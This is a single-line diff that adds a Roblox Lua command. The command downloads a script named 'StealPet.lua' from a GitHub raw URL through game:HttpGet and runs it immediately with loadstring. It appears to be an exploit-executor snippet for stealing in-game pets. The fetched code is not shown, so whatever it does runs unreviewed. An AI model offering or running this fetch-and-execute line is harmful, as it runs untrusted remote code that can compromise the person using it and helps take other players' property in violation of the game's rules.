@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xxqLgnd/Utilities/main/StealPet.lua",true))()
